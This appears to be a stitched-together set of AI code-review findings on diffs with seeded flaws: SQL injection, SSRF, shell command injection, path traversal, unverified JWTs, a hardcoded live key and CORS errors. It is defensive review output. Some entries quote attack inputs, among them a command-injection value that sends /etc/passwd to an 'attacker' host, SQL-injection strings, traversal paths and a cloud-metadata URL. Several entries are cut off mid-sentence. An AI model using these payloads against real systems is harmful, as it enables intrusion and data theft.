The existing caller `render_row` in `reports/weekly.py` does `name, email = lookup_user(user_id)`; unpacking a 3-key dict raises `ValueError: too many values to unpack (expected 2)` on every call, and even with two keys it would bind the key strings rather than the values, producing `"name" <"email">`. findings.title: Mutable default `attempted=[]` accumulates across calls
findings.body:
The default list is evaluated once at function-definition time and shared by every call that omits `attempted`. Failed recipients from earlier calls stay in the list, so each subsequent call returns a growing union of all past failures rather than just this call's failures — and any caller that mutates the returned list corrupts the default for everyone. Use `attempted=None` and `attempted = [] if attempted is None else attempted` (or build a fresh local list and ignore the parameter), matching the `extra_headers or {}` idiom already used on line 2 of this same file.

findings.title: Off-by-one in page_of_sorted slice drops one record per page
findings.body:
The slice `ordered[start : start + PAGE_SIZE - 1]` returns only `PAGE_SIZE - 1` items. Because `start` still advances by the full `PAGE_SIZE` per page (line 11), the record at index `start + PAGE_SIZE - 1` is never returned by any page — it is silently dropped from the export entirely, not merely deferred to the next page. Callers that page until a short/empty result will also terminate early or see an inconsistent page size versus `page_of`. Change line 12 to `return ordered[start : start + PAGE_SIZE]` to match the existing helper on line 6.

_Also raised by the docs agent:_ page_of_sorted returns one fewer record than page_of

No test exists for this function, so nothing would fail if the slice bound is wrong. A test asserting the returned page length equals PAGE_SIZE (for a full page) would catch this.

findings.title: `page` used as slice offset without lower-bound validation
findings.body:
`start = page * PAGE_SIZE` is fed straight into a list slice. If a caller passes a negative `page` (e.g. a `page` query parameter parsed with `int()` and not clamped), `start` becomes negative and Python's slicing wraps to the end of the sequence, so the caller receives records from the tail of the dataset instead of an empty page. For an export endpoint that is a confusing, potentially record-disclosing response for a request the API should have rejected.

Suggest rejecting or clamping at the boundary: `if page < 0: raise ValueError(...)` (or `page = max(page, 0)`) before computing `start`, and applying the same guard to the existing `page_of` on line 5.

Note: I cannot see the HTTP handler that supplies `page`, so this is only exploitable if that handler does not already validate. No repository context was retrieved, hence the moderate confidence.

findings.title: File handle leaks on header-mismatch and exception paths
findings.body:
`fh = open(path)` is not wrapped in a `with` block, and `fh.close()` on line 16 is only reached on the success path. When `header != expected_header` the function returns on line 14 with the handle still open, so every rejected file leaks a descriptor until GC happens to collect it (and never, on implementations without refcounting). The same leak occurs if `next(reader)` (line 12) or `list(reader)` (line 15) raises — e.g. a decode error on a non-UTF-8 file. Restructure to mirror the existing `read_rows`:

```python
def read_validated(path, expected_header):
    with open(path) as fh:
        reader = csv.reader(fh)
        ...
```

which makes the close unconditional and lets the early `return` stay.

findings.title: Retry wrapped around non-idempotent charge can double-bill
findings.body:
`@retry(attempts=3)` re-invokes `charge(card_token, amount_cents)` on any failure. `billing.gateway.charge` documents itself as "NOT idempotent: each call creates a new charge." A failure mode where the POST reaches the gateway but the response is lost (timeout, connection reset, 5xx after commit) will be retried and create a second — and possibly third — charge for the same intent. The adjacent `fetch_charge` is fine because `get_charge` is a documented-safe GET.

Fix: generate a stable idempotency key per logical charge attempt and pass it through so all retries share it, per the gateway docstring ("The gateway supports an Idempotency-Key header; pass one to make retries safe"). The key must be created by the caller (or once outside the retry loop), not inside the retried function. Alternatively, restrict the retry to errors that are provably pre-send (e.g. connection-refused / DNS) rather than retrying all exceptions.

_Also raised by the security agent:_ Retry on non-idempotent charge can double/triple-bill customers

findings.title: Retry-decorated non-idempotent function lacks safety documentation
findings.body: The new public function `charge_card` applies a retry decorator to `charge()`, which the gateway documentation explicitly marks as NOT idempotent. findings.title: Misleading function name: get_* suggests read-only but mutates cache
findings.body: The function `get_tenant_fresh` uses the `get_*` naming convention, which conventionally indicates a read-only lookup operation. findings.title: Size guard wipes the whole cache, including the entry just written
findings.body: When `_CACHE` crosses 1000 entries, `_CACHE.clear()` discards every cached tenant, including the one inserted on line 10 moments earlier. Two consequences: (a) a caller that does `get_tenant_fresh(x)` followed by `get_tenant(x)` will get `None` from the second call for the one request that happens to trip the threshold, even though the fetch succeeded; (b) every 1000th insertion causes a full cold cache, so all other tenants take a fetch hit at once — a periodic thundering herd rather than gradual eviction. Use a bounded structure with per-entry eviction (e.g. `collections.OrderedDict` with `popitem(last=False)`, or `functools.lru_cache`/`cachetools.LRUCache`) instead of an all-or-nothing clear; at minimum, re-insert the current entry after clearing.

findings.title: A `None` result from `_fetch` is cached and indistinguishable from a miss

Separately, even with the shell removed, `name` is concatenated into a filesystem path, so a value like `../../etc/cron.d/x` writes outside `/exports`. findings.title: origin:"*" with credentials:true is rejected by browsers
findings.body: `cors({ origin: "*", credentials: true })` emits the literal header `Access-Control-Allow-Origin: *` alongside `Access-Control-Allow-Credentials: true`. The Fetch spec forbids this combination: when a request is made with `credentials: 'include'` (or `withCredentials`), a wildcard ACAO causes the browser to block the response, so every credentialed dashboard request will fail with a CORS error despite the middleware appearing permissive. The existing `ALLOWED` config on line 6 is the correct shape — reflect the request origin against an allow-list (or pass a function/array of dashboard origins) instead of `"*"`, or drop `credentials: true` if the dashboard genuinely does not send cookies or auth headers. As written the two options contradict each other, so one of them is dead configuration whichever way the caller uses it.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. This pairing is never correct:

- If the middleware emits the literal `Access-Control-Allow-Origin: *` alongside `Access-Control-Allow-Credentials: true`, every browser rejects the response for credentialed requests, so the dashboard's cookie/authorization-bearing fetches will fail — a functional break rather than a security hole.
- If the middleware (or any wrapper/proxy in front of it) instead reflects the request's `Origin` header to satisfy the credentials rule, then any attacker-controlled origin is permitted to make credentialed cross-origin requests and read the responses. Entry point: the `Origin` request header on any route mounted with `dashboardCors`. Sink: the `Access-Control-Allow-Origin` response header. That is a full cross-origin read of authenticated dashboard data from a page the victim visits.

Fix by enumerating the dashboard's real origins the way the existing export does (`origin: ALLOWED` on line 6), or drop `credentials: true` if the dashboard endpoints are genuinely public and unauthenticated.

findings.title: Live payments API key hardcoded, replacing env var lookup
findings.body:
`ACMEPAY_SECRET_KEY = "acme_live_..."` commits what appears to be a production payment-provider secret key to source control. The `acme_live_` prefix is the conventional marker for a live (not test) key. Anyone with read access to the repository — plus anyone who ever obtains a clone, a CI cache, a build artifact, or the git history — can charge, refund, or read customer payment data through this key.

Remedy, in order: (1) revoke and rotate the key at the provider immediately, since it must be treated as compromised the moment it was pushed; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or an equivalent secret-manager read) that this diff removed; (3) purge the value from git history, because reverting the commit leaves it reachable.

If this literal is in fact a scrubbed/fake value, it should still not use the `acme_live_` prefix — use an obvious placeholder so scanners and reviewers are not forced to assume the worst.

findings.title: tenant_of trusts unverified JWT claims (forgeable tenant id)
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, so the payload is parsed without checking the RS256 signature. Anyone who can present a token can craft an arbitrary `tenant_id` and the function will return it, which breaks tenant isolation for every caller that uses the result to scope data. Note also that in PyJWT 2.x the `verify_exp`/`verify_aud` checks default to off once `verify_signature` is false, so expired tokens are accepted too. Decode via the existing verified path — e.g. `return claims_for(token)["tenant_id"]` — and accept the key lookup cost, or cache the key rather than skipping verification.

_Also raised by the security agent:_ tenant_id read from JWT with signature verification disabled

findings.title: read_export_preview skips _confined(), allowing path escape

The sibling reader resolves the caller-supplied `name` through `_confined(name)` before opening it (line 14). `read_export_preview` instead does a raw `os.path.join(EXPORT_ROOT, name)`. `os.path.join` does not confine: a `name` of `../../etc/passwd` walks out of the export root, and an absolute `name` like `/etc/passwd` discards `EXPORT_ROOT` entirely, so the function returns the first 4096 bytes of an arbitrary file. findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` concatenates the `term` and `status` arguments straight into the SQL text on line 9 and passes the finished string to `execute(sql)` with no params on line 10. Any caller value containing a single quote breaks out of the literal — e.g. `status = "x' OR '1'='1"` returns every customer, and `term = "%'; DROP TABLE customers; --"` is limited only by whether the driver permits multiple statements.

Use placeholders and let the driver bind, matching `get_customer` one line above and the contract documented in `billing/db.py` ("`params` must carry every caller value"):

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

Note the wildcards belong in the bound parameter, not in the SQL text. If `status` is meant to be one of a fixed set, validate it against an allow-list as well.

There is no test in this diff exercising search_customers with any input (e.g. a term or status containing a quote), so nothing would catch a broken query, a syntax error from special characters, or a query that behaves incorrectly under normal inputs. findings.title: SSRF: verify_endpoint fetches caller URL with no host/scheme check
findings.body:
`verify_endpoint(url)` passes its argument straight to `requests.get` with no validation. The function immediately above it in the same module guards its request with `if host not in ALLOWED_HOSTS: raise ValueError("destination not allowed")` (lines 8-9), so the module already has the control this new path skips.

Given the PR description ("Let customers register a webhook target"), `url` is customer-supplied, which makes this a server-side request forgery sink: an attacker can point it at `http://169.254.169.254/...` for cloud instance metadata, at internal-only services on `127.0.0.1`/RFC1918 ranges, or at non-HTTP schemes `requests` can still handle (`file://` via adapters, `http://user:pass@...` credential probing). Even the returned status code is a usable oracle for internal port/host scanning.

Suggested fix: route this through the same validation used on line 8 — parse the URL, require `scheme in {"http", "https"}`, require the resolved host to be in `ALLOWED_HOSTS` (or at minimum reject loopback/link-local/private/reserved IPs after resolution), and pass `allow_redirects=False` so a permitted host cannot 302 the request into the internal network. Factor the check into a shared `_assert_allowed(url)` helper so future call sites cannot forget it.

findings.title: verify_endpoint bypasses the ALLOWED_HOSTS invariant enforced above
findings.body: The function immediately above rejects any destination whose host is not in `ALLOWED_HOSTS` before issuing the request. `verify_endpoint` performs the same class of operation — a server-side fetch of a caller-supplied URL — but does no host or scheme validation at all, so the invariant the module otherwise maintains no longer holds for every outbound request in this file. Extract the host/scheme check into a helper and call it from both paths (and pass `allow_redirects=False`, since a redirect from an allowed host would otherwise re-open the same hole).

findings.body: verify_endpoint fetches an arbitrary caller-supplied URL and returns its status code, but unlike the adjacent function it does not check ALLOWED_HOSTS, and no test in this diff exercises it at all. If someone later adds a host check here, or if the missing check is a bug, nothing in the test suite would fail either way — the function's behaviour is completely unverified.

findings.title: Public access block disabled on customer invoices bucket
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets all four guardrails (`block_public_acls`, `block_public_policy`, `ignore_public_acls`, `restrict_public_buckets`) to `false` on a bucket named `acme-customer-invoices`. This is the same block used for the intentionally-public `assets` bucket and looks like it was copied. With all four false, any bucket policy or object ACL granting `AllUsers`/`AuthenticatedUsers` — whether added deliberately later, by another module, or by a compromised/over-broad IAM principal — will take effect and expose customer invoices to anonymous readers. The bucket name is also a guessable, globally-visible identifier, so discovery is trivial.

Unless public invoice serving is an explicit requirement, set all four attributes to `true` (or simply omit the resource and rely on the account-level default, which now blocks public access). Consider also adding server-side encryption and versioning for a bucket of this sensitivity.

findings.title: invoices bucket disables all public-access blocks (copy-paste of assets)

For a bucket named `acme-customer-invoices` this actively turns off AWS's default account/bucket-level protection, so any ACL or bucket policy that grants public read will take effect. Unless public exposure of invoices is intended, all four attributes should be `true` — or the resource should simply be removed so the secure AWS default applies.

findings.title: Signature compared with == instead of hmac.compare_digest
findings.body:
`verify_acmepay` computes the expected HMAC exactly as `verify_stripe` does, but returns `expected == header`. Python's `==` on strings short-circuits at the first differing byte, so comparison time leaks how many leading hex characters of a forged signature are correct; an attacker who can submit repeated webhooks can recover a valid signature byte-by-byte without knowing the secret. Use `hmac.compare_digest(expected, header)` here, matching line 7.

findings.title: New verify_acmepay function has no accompanying test

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` returns `hashlib.md5(raw.encode()).hexdigest()`. MD5 is a fast, unsalted hash: an attacker who obtains the stored values (SQL injection, backup leak, insider) can recover the underlying passwords with commodity GPU cracking or rainbow tables in seconds, and identical passwords produce identical digests across accounts. The function sitting next to `hash_password`, which already does the right thing with `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())`, shows the intended primitive.

If this value is a stored credential, delegate to `hash_password` (bcrypt/argon2) and verify with `bcrypt.checkpw`. If it is actually a one-time reset *token* rather than a user-chosen password, generate it with `secrets.token_urlsafe`, store `hashlib.sha256` of it, compare with `hmac.compare_digest`, and give it a short expiry — and rename the function, because `..._password` reads as credential storage.

Both evidently feed the same stored-password column, but a verifier built on `bcrypt.checkpw(raw, stored)` will either raise `ValueError: invalid salt` or return False for any credential written through the reset path, so users who reset cannot log in. If instead the verifier is being taught to accept both formats, that permits an unsalted, uncomparable-cost hash to authenticate.

The reset path should produce the same representation as `hash_password` — i.e. call `hash_password(raw)` (or `bcrypt.hashpw`) rather than `hashlib.md5`. If a reset *token* rather than a password hash was intended, this should use `secrets.token_urlsafe` and a name that says so.

findings.title: Blocking requests.get inside async fetch_plan_limits stalls the event loop
findings.body:
`fetch_plan_limits` is declared `async` but its body contains no `await` — `requests.get` is a synchronous, blocking socket call. When called from an async handler it will block the entire event loop thread for the full duration of the billing request (up to the 5s `timeout`), stalling every other in-flight request on that worker, including the concurrent `fetch_plan` calls immediately above.

Use the async client that is already a dependency, mirroring `fetch_plan`:

```python
async def fetch_plan_limits(client: httpx.AsyncClient, tenant_id):
    response = await client.get(f"https://billing.internal/limits/{tenant_id}", timeout=5)
    return response.json()
```

If threading the client through is not practical here, at minimum wrap the blocking call in `anyio.to_thread.run_sync` / `asyncio.to_thread` so it does not occupy the loop. Note also that passing the client in (as `fetch_plan` does) reuses the connection pool, whereas `requests.get` opens a fresh TCP+TLS connection per call.

findings.body:
`fetch_plan_limits` builds the request URL with an f-string: `f"https://billing.internal/limits/{tenant_id}"`. If `tenant_id` is caller-supplied and not validated upstream, values containing `/`, `..`, `?` or `#` change the path or query that is sent to the internal billing host (e.g. `../../admin/keys`, or `1?force=true`). That turns a plan lookup into an arbitrary-path request against an internal service that is presumably reachable only from this process.

Fix by validating the shape of `tenant_id` (UUID / `^[A-Za-z0-9_-]+$`) before use, or by letting the HTTP client do the quoting — e.g. `urllib.parse.quote(str(tenant_id), safe="")`, or pass it as a parameter rather than a path segment. Note that `requests`/urllib3 do not reliably collapse `..` segments for you, so relying on client-side normalisation is not a defence.

findings.title: try_consume races on _counters: limit bypass and lost updates
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, yields control at the `await asyncio.sleep(0)` on line 18, and only then writes `_counters[tenant] = current + cost` on line 19. Any other coroutine that runs during that suspension sees the old count, so N concurrent callers can each pass the `current + cost > LIMIT` check on line 16 and collectively push the counter well past `LIMIT`. Worse, the write on line 19 is an absolute assignment derived from the stale read rather than a read-modify-write, so an increment applied by `consume` (lines 9-11) while `try_consume` is suspended is silently discarded — the counter can even move backwards.

It also does not take `_lock`, which the sibling `consume` holds for exactly this state, so the module's own synchronisation invariant is broken.

Fix: wrap the whole read/check/write in `async with _lock:`, and do the write as a read-modify-write (`_counters[tenant] = _counters.get(tenant, 0) + cost`) so no update is lost. Also drop the `await asyncio.sleep(0)` inside the critical section, or if it must stay, note that awaiting under the lock is safe only because the lock serialises entry.

_Also raised by the security agent:_ Rate limit bypass: check-then-act across await without the lock

A caller needs to know: (1) what the return value means — does `False` mean the limit was exceeded or the operation failed?; (2) what `cost` represents and what units `LIMIT` uses; (3) whether there are any race conditions or consistency guarantees. The current implementation has a check-then-act race between lines 15–16 and line 19 (reads `_counters`, then after an await, writes without re-checking). This needs to be either documented as a known limitation or fixed, but it is invisible without a docstring.

findings.body:
`fh = open(path)` is only closed on the success path (line 16). When `header != expected_header` the function returns at line 14 with the handle still open, and any exception raised by `next(reader)` or `list(reader)` (decode errors, I/O errors, `StopIteration` on an empty file) escapes with the handle open too. Wrap the open in a context manager, exactly as `read_rows` does on line 5:

```python
def read_validated(path, expected_header):
    with open(path) as fh:
        reader = csv.reader(fh)
        header = next(reader, None)
        if header != expected_header:
            return None
        return list(reader)
```

findings.title: Retry wraps non-idempotent charge() without an idempotency key
findings.body:
`charge()` is documented in billing/gateway.py as "NOT idempotent: each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any failure that occurs after the POST has reached the gateway (timeout, dropped connection, 5xx on a request the gateway actually processed) will be retried and will create a second and third charge against the customer's card. This is a money-losing defect, not a theoretical one.

The gateway docstring already names the fix: it supports an `Idempotency-Key` header. Generate a key once in `charge_card` (per logical charge attempt, not per retry) and pass it through to `charge()`, so retries collapse to the same charge server-side. Alternatively, restrict the retry to errors that are provably pre-transmission (e.g. connection-establishment failures), or drop the retry here entirely and let the caller handle failure.

Note the contrast with `fetch_charge` on lines 5-7: `get_charge` is documented "Safe to repeat," so the retry there is correct. The same decorator is not safe on the write path.

findings.title: Overflow handling clears the entry just written (and all others)
findings.body:
When the cache reaches 1001 entries, `_CACHE.clear()` discards every entry, including the one written on line 10 for the tenant the caller just asked for. So on the boundary call, `get_tenant_fresh` returns the tenant but leaves the cache empty, and an immediately following `get_tenant(tenant_id)` returns `None` — the opposite of what the write on line 10 was for. It also drops every other warm entry at once, so all subsequent readers miss and re-`_fetch` simultaneously.

If a size bound is needed, evict selectively (e.g. `collections.OrderedDict` with `popitem(last=False)`, or `functools.lru_cache`), and evict *before* inserting so the new entry survives.

If `tenant_id` is reachable from a request parameter, a caller can issue ~1000 requests with distinct (including non-existent) ids and evict every other tenant's entry, forcing all subsequent `get_tenant` calls to miss and pushing load onto `_fetch` for every tenant — a cheap amplification against a shared resource. findings.title: Command injection: shell=True with interpolated name/directory
findings.body:
`create_archive` interpolates `name` and `directory` straight into a shell string and executes it with `shell=True`. Any shell metacharacter in either argument escapes the intended command: `name = "x; curl attacker/$(cat /etc/passwd)"` or `name = "x`id`"` runs arbitrary commands with the privileges of the service process.

Fix by dropping the shell entirely and passing an argument list, exactly as the existing `list_exports` on line 5 already does:

```python
archive_path = os.path.join("/exports", f"{name}.tar.gz")
return subprocess.run(["tar", "-czf", archive_path, directory], check=True)
```

Separately, `name` is also concatenated into a filesystem path with no validation, so a value like `../../etc/cron.d/x` writes outside `/exports` even after the shell is removed. Constrain `name` to a safe character set (e.g. `^[A-Za-z0-9._-]{1,64}$`, rejecting `..`) and verify the resolved path stays under `/exports` before writing.

findings.title: Unquoted shell interpolation breaks on spaces and glob characters
findings.body: `cmd` is assembled by string interpolation and executed via `shell=True`, with neither `name` nor `directory` quoted. For entirely ordinary inputs this produces the wrong command: `create_archive("my report", "/data/q1 reports")` becomes `tar -czf /exports/my report.tar.gz /data/q1 reports`, so tar receives four operands instead of two and either fails or archives the wrong paths. A `directory` containing `*`, `?` or `~` is glob-expanded by the shell before tar sees it, and `;`/`&&`/backtick characters terminate the command entirely. Pass an argument list instead — `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)` — matching the list form already used by `list_exports` on line 5; if a shell is genuinely required, wrap each interpolated value in `shlex.quote`.

findings.title: No test coverage for create_archive's shell command construction
findings.body: create_archive builds a shell command string via f-string interpolation of `name` and `directory` and executes it with shell=True. There is no test file in this diff exercising this function, so a change that breaks quoting/escaping, mishandles special characters in `name`/`directory`, or otherwise alters the constructed command would not be caught by any existing test.

findings.title: origin:"*" with credentials:true is rejected by browsers
findings.body:
The `cors` middleware with `origin: "*"` emits the literal header `Access-Control-Allow-Origin: *`. Per the Fetch spec, a user agent must fail any request made with `credentials: "include"` when the allow-origin header is the wildcard, regardless of `Access-Control-Allow-Credentials`. So this config does not achieve what it evidently intends (letting the new dashboard send cookies/auth headers) — those requests will be blocked in the browser, and preflights will fail too.

To make credentialed cross-origin requests work, reflect a specific allowed origin instead of `*`, e.g. pass a function or an explicit list (`origin: DASHBOARD_ORIGINS`) so the middleware echoes the request origin and adds `Vary: Origin`. If credentials genuinely are not needed for the dashboard, drop `credentials: true` instead and keep the wildcard.

findings.title: Wildcard CORS origin combined with credentials: true
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. The two are mutually incompatible in the CORS spec: `Access-Control-Allow-Origin: *` may not be used with `Access-Control-Allow-Credentials: true`, so one of two bad outcomes follows depending on the middleware's implementation:

1. The middleware emits the literal `*` — every credentialed cross-origin fetch to the dashboard routes is rejected by the browser, so the endpoint is silently broken for its intended callers.
2. The middleware normalises `"*"` by reflecting the request's `Origin` header (several wrappers do this so that credentials keep working) — in which case any attacker-controlled page can issue cookie-bearing requests to the dashboard API and read the responses, giving cross-origin read access to authenticated data and bypassing the CSRF protection that same-origin policy would normally provide.

Fix by enumerating the dashboard's real origins, the way line 6 already does with `ALLOWED`, e.g. `origin: DASHBOARD_ALLOWED` (an explicit list or allowlist callback) rather than `"*"`. If the dashboard truly needs public, unauthenticated access, drop `credentials: true` instead.

I cannot see the routes this middleware is mounted on, nor which `cors` implementation is imported, so the concrete blast radius (which endpoints, which cookies) is not verifiable from this diff.

findings.title: Live payment API secret hardcoded in source, replacing env lookup
findings.body:
`ACMEPAY_SECRET_KEY` is a literal credential with an `acme_live_` prefix, committed into `billing/acmepay_client.py` and assigned to `acmepay.api_key`. Anyone with read access to the repository — including anyone who obtains a clone, a CI artifact, or a forked history — gains the production payments credential, and it stays exposed in git history even if the line is later removed.

Actions: (1) treat this key as compromised and rotate it at the payment provider now; (2) restore the previous `acmepay.api_key = os.environ["ACMEPAY_SECRET_KEY"]` (and the `import os` this diff deletes) or read it from your secret manager; (3) purge the value from history or confirm with the provider that the revoked key cannot be reused; (4) consider adding a pre-commit secret scanner so this class of regression fails before merge.

findings.body: `client()` previously read `os.environ["ACMEPAY_SECRET_KEY"]`, which let each environment (dev, CI, staging, prod) supply its own key and failed fast with a `KeyError` when unconfigured. After this change the module-level constant on line 4 is used unconditionally, so the `ACMEPAY_SECRET_KEY` environment variable set by any existing deployment or test harness is silently ignored, and every environment — including CI and local dev — will authenticate against the live gateway implied by the `acme_live_` prefix. Tests or staging runs that previously no-op'd or errored will now issue real charges. Restore the environment lookup (optionally with an explicit default or a clear startup error) rather than embedding the value.

findings.title: tenant_of returns an unverified, caller-forgeable tenant id
findings.body: `tenant_of()` calls `jwt.decode(..., options={"verify_signature": False})`, so the payload is parsed but never authenticated. Any client can mint a token with an arbitrary `tenant_id` (no key required) and this function will return it, which breaks tenant isolation for every caller that uses the result to scope a query or an authorization check. The sibling function `claims_for()` two lines above already does the verified decode with `public_key()`; `tenant_of` should be built on it, e.g. `return claims_for(token)["tenant_id"]`, rather than re-decoding unverified to skip the key lookup. In PyJWT, disabling `verify_signature` also turns off `exp`/`nbf`/`aud` validation by default, so expired tokens are accepted here too.

findings.title: tenant_id read from JWT with signature verification disabled
findings.body:
`tenant_of()` calls `jwt.decode(token, options={"verify_signature": False})` and returns `unverified["tenant_id"]`. A JWT is supplied by the client (header/cookie/param), so with verification off an attacker can mint any payload they like — base64 a header and body with `tenant_id` set to a victim tenant, append any signature — and this function will happily return it. If the returned value is used to scope queries, pick a database/schema, or authorise a request, it is a complete cross-tenant authorisation bypass. Disabling verification also skips `exp`, `nbf`, `iss` and `aud` checks, so revoked/expired tokens pass too.

Fix: derive the tenant from verified claims. The module already has `claims_for()` on line 7 which verifies with `public_key()` and pins `algorithms=["RS256"]`; implement `tenant_of` as `return claims_for(token)["tenant_id"]`. If the motivation was avoiding a key lookup, cache `public_key()` rather than skipping verification. If an unverified peek is genuinely needed (e.g. to select which key to fetch), name it `unsafe_unverified_tenant_hint()`, never use it for authorisation, and re-verify before acting. Also note `unverified["tenant_id"]` will raise `KeyError` on a token lacking the claim.

findings.title: New tenant_of() has no test coverage
findings.body: tenant_of() decodes the token with signature verification disabled and returns an attacker-controllable claim. There is no test in this diff verifying its behavior (e.g., that it extracts tenant_id, or documenting/guarding the unverified-decode choice). If this function's logic changes or is inadvertently 'fixed' to require verification (breaking callers) or left broken, nothing would fail.

findings.title: Public function `tenant_of()` lacks documentation of its verification behavior
findings.body: The function `tenant_of()` is a public API (alongside `claims_for()` which verifies) that deliberately disables JWT signature verification. A caller reading the name and signature would have no way to know this, and might assume it provides the same verification guarantees as `claims_for()`. This could lead to misuse in contexts where signature verification is required for security. Add a docstring explaining that signature verification is intentionally disabled and documenting the preconditions for safe use.

findings.title: Missing ownership check lets any user modify others' payment methods
findings.body:
`update_payment_method` takes `pm_id` from the request, fetches the object with `PaymentMethod.get(pm_id)` (line 12) and immediately writes `body["billing_name"]` and calls `pm.save()` (lines 13-14) — no authorisation check happens between the load and the mutation. `current_user(request)` on line 11 only authenticates; its result is assigned to `user` and then never used, which strongly suggests the `require_owner` call was simply forgotten. Any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on another account's saved payment method.

Fix: add `require_owner(user, pm)` immediately after the fetch, mirroring line 6:

```python
user = current_user(request)
pm = PaymentMethod.get(pm_id)
require_owner(user, pm)
```

Ideally also scope the query to the owner (`PaymentMethod.get_for_user(pm_id, user.id)`) so the default is safe. Consider a regression test that asserts a 403 when user A updates user B's payment method.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ body["billing_name"] raises KeyError when the field is absent

findings.title: Public endpoint contract undocumented: authorization missing
findings.body: The `update_payment_method` function is a public endpoint (parameter names match the HTTP handler pattern: `request, pm_id, body`) but has no docstring describing its authorization behavior. A caller or maintainer cannot determine whether it enforces ownership—and in fact, it does not call `require_owner()` as the codebase pattern requires. The repository establishes in `auth.py` that 'Every object mutation must call this' (line 8 of the context), making the absence of both documentation and the authorization call a contract violation.

findings.title: No test exercises update_payment_method's authorization

findings.title: read_export_preview skips _confined(), allowing escape from EXPORT_ROOT
findings.body:
The sibling reader above resolves the caller-supplied `name` through `_confined(name)` before opening it (line 14). `read_export_preview` instead does a raw `os.path.join(EXPORT_ROOT, name)`, so any `name` containing `../` walks out of the export directory, and an absolute `name` (e.g. `/etc/passwd`) makes `os.path.join` discard `EXPORT_ROOT` entirely and open that path directly. Route the new function through the same helper: `path = _confined(name)` and then read `limit` bytes. Keeping the two readers on different validation paths is exactly the kind of divergence that gets missed later.

_Also raised by the security agent:_ Path traversal: read_export_preview skips _confined() on `name`

findings.title: No test would catch missing path confinement in read_export_preview
findings.body: read_export_preview builds its path with a raw os.path.join(EXPORT_ROOT, name) instead of the _confined() helper used by the neighboring handler (line 14). If a caller passes name='../../etc/passwd', this function would read outside EXPORT_ROOT. Nothing in this diff exercises this function, so this behavior difference from its sibling would go unnoticed until exploited or reported. Add a test asserting that read_export_preview raises/rejects a name containing '..' or an absolute path, mirroring whatever test exists (or should exist) for the confined handler.

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` interpolates `term` and `status` straight into the SQL text and calls `execute(sql)` with no parameter tuple, so the values are parsed as SQL by the driver. Either argument can close the quote and append arbitrary SQL — e.g. `status = "x' OR '1'='1"` returns every customer row, and a value containing `'; DROP TABLE customers; --` is limited only by whether the driver permits multiple statements.

Fix it the same way line 5 already does — pass values as parameters and keep the wildcards in the bound value, not in the SQL:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

Note the docstring on `billing/db.execute` states `params` must carry every caller value, so this call also violates the helper's documented contract.

findings.title: search_customers bypasses execute()'s params contract, breaks on quotes/None
findings.body:
`billing.db.execute` documents that `params` "must carry every caller value", and `get_customer` on line 5 follows that by passing `(customer_id,)`. `search_customers` instead builds the whole statement with an f-string and calls `execute(sql)` with `params=None`, so no caller value reaches the driver as a bound parameter.

Beyond the contract, this is wrong for reachable inputs: a `term` or `status` containing an apostrophe (e.g. `O'Brien`) terminates the quoted literal and the statement fails or changes meaning, and `None` renders as the literal string `'None'` rather than matching NULL/being rejected.

Rewrite in the same shape as line 5, e.g. `execute("SELECT * FROM customers WHERE name LIKE %s AND status = %s", (f"%{term}%", status))`, keeping the wildcards in the parameter value rather than in the SQL text.

findings.title: search_customers has no test exercising its query construction
findings.body: The new search_customers function builds its SQL via f-string interpolation of `term` and `status`. There is no test in this diff verifying the query it produces or its behavior with adversarial input (e.g. a name containing `%`, `'`, or SQL metacharacters). If this function were changed or fixed to use parameters, nothing would fail; if it were left broken, nothing would fail either. This is the kind of behavior change that has zero coverage.

findings.title: SSRF: verify_endpoint fetches caller-supplied URL with no allowlist or scheme check
findings.body:
`verify_endpoint(url)` passes the URL straight into `requests.get` with no validation. The function immediately above it (lines 8-10) demonstrates the intended control for this module: parse the host and reject it unless it is in `ALLOWED_HOSTS`. The new function skips that entirely.

Consequences an attacker gets from a webhook-registration flow:
- Reach internal-only services and cloud metadata (`http://169.254.169.254/...`, `http://localhost:*/`), using the returned status code as an oracle for internal port/host scanning.
- Use non-HTTP schemes that `requests` or its adapters may accept (e.g. `file://` via a custom adapter) since there is no scheme check.

Fixes:
1. Route through the same validation as `post_webhook`: resolve the URL, require `https` (or `http`/`https`), and check the host against `ALLOWED_HOSTS` before issuing the request — ideally by extracting the existing check into a shared `_assert_allowed(url)` helper so the two paths cannot drift again.
2. Pass `allow_redirects=False` (or re-validate each hop), otherwise an allowlisted host can 302 the request to an internal address and bypass the check.
3. Do not return raw response detail to the caller beyond what is needed; the status code alone is already a weak oracle, so rate-limit this endpoint.

_Also raised by the correctness agent:_ verify_endpoint skips the ALLOWED_HOSTS check the sibling function enforces

findings.title: verify_endpoint lacks any test and skips the host allowlist check
findings.body: verify_endpoint performs a server-side GET against a caller-supplied URL but, unlike the function above it, does not call the host-allowlist validation (lines 8-9) before making the request. No test exists to confirm this function validates its input the same way the existing post path does, so a regression (or the missing check itself) would go undetected.

findings.title: verify_endpoint raises instead of reporting unreachable endpoints
